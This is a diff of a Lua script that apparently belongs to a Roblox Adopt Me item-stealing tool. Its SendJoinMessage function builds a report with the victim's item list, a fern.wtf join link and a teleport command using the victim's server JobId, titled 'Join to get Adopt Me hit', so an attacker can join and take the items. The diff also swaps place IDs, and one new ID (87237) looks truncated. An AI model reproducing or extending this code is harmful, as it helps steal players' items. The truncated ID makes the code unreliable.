@@ -131,7 +131,7 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
+            value = "https://fern.wtf/joiner?placeId=920587237&gameInstanceId=" .. game.JobId
         },
         {
             name = "Item list:",
@@ -188,7 +188,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(87237, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = "\240\159\144\178 Join to get Adopt Me hit",
             ["color"] = 65280,
